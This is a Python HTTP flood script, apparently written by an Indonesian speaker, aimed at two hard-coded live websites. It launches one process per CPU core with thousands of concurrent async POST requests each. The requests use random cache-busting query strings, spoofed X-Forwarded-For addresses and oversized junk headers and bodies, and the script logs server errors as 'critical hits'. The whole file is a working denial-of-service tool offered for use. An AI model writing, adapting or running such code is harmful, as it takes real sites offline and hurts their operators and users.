import asyncio
import aiohttp
import random
import string
import multiprocessing
import logging

# --- TARGET CONFIGURATION ---
TARGETS = ["https://inihari88.shop/", "https://ingatcuan88.pro/amp/"]

# Setup Logging biar lu bisa cek hasilnya di file log nanti
logging.basicConfig(filename='attack_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

def rs(length=30):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# --- VECTOR AGGREGATOR ---
async def vector_handler(session, t):
    while True:
        try:
            # Campuran serangan dalam satu loop agar efisien
            # DB Stress + Cloud Cracker logic
            url = f"{t}?s={rs(20)}&t={random.random()}&cat={random.randint(1,999)}"
            
            headers = {
                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) {rs(5)}",
                "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                "Cache-Control": "no-store, no-cache",
                "Large-Trash-Header": "X" * 1024
            }

            # Gunakan POST agar server kerja lebih keras memproses body
            async with session.post(url, data={"p": rs(1000)}, headers=headers, timeout=8) as r:
                if r.status >= 500:
                    logging.info(f"CRITICAL HIT! Status: {r.status} on {t}")
                await r.content.read(10)
        except:
            await asyncio.sleep(0.01)

def start_engine(target_url):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    async def ignite():
        # Tanpa limit koneksi sama sekali
        conn = aiohttp.TCPConnector(limit=0, ssl=False, ttl_dns_cache=1000)
        async with aiohttp.ClientSession(connector=conn) as session:
            # 2500 task per core = 50.000 total request serentak di 20 Core
            tasks = [vector_handler(session, target_url) for _ in range(2500)]
            await asyncio.gather(*tasks)
    loop.run_until_complete(ignite())

if __name__ == "__main__":
    print("🔱 THE ETERNAL LEVIATHAN ACTIVATED 🔱")
    print("Check 'attack_log.txt' to see the destruction progress.")
    
    num_cores = multiprocessing.cpu_count()
    for i in range(num_cores):
        target = TARGETS[i % len(TARGETS)]
        p = multiprocessing.Process(target=start_engine, args=(target,))
        p.daemon = True # Biar jadi background process
        p.start()

    # Biar main process gak exit
    multiprocessing.Event().wait()
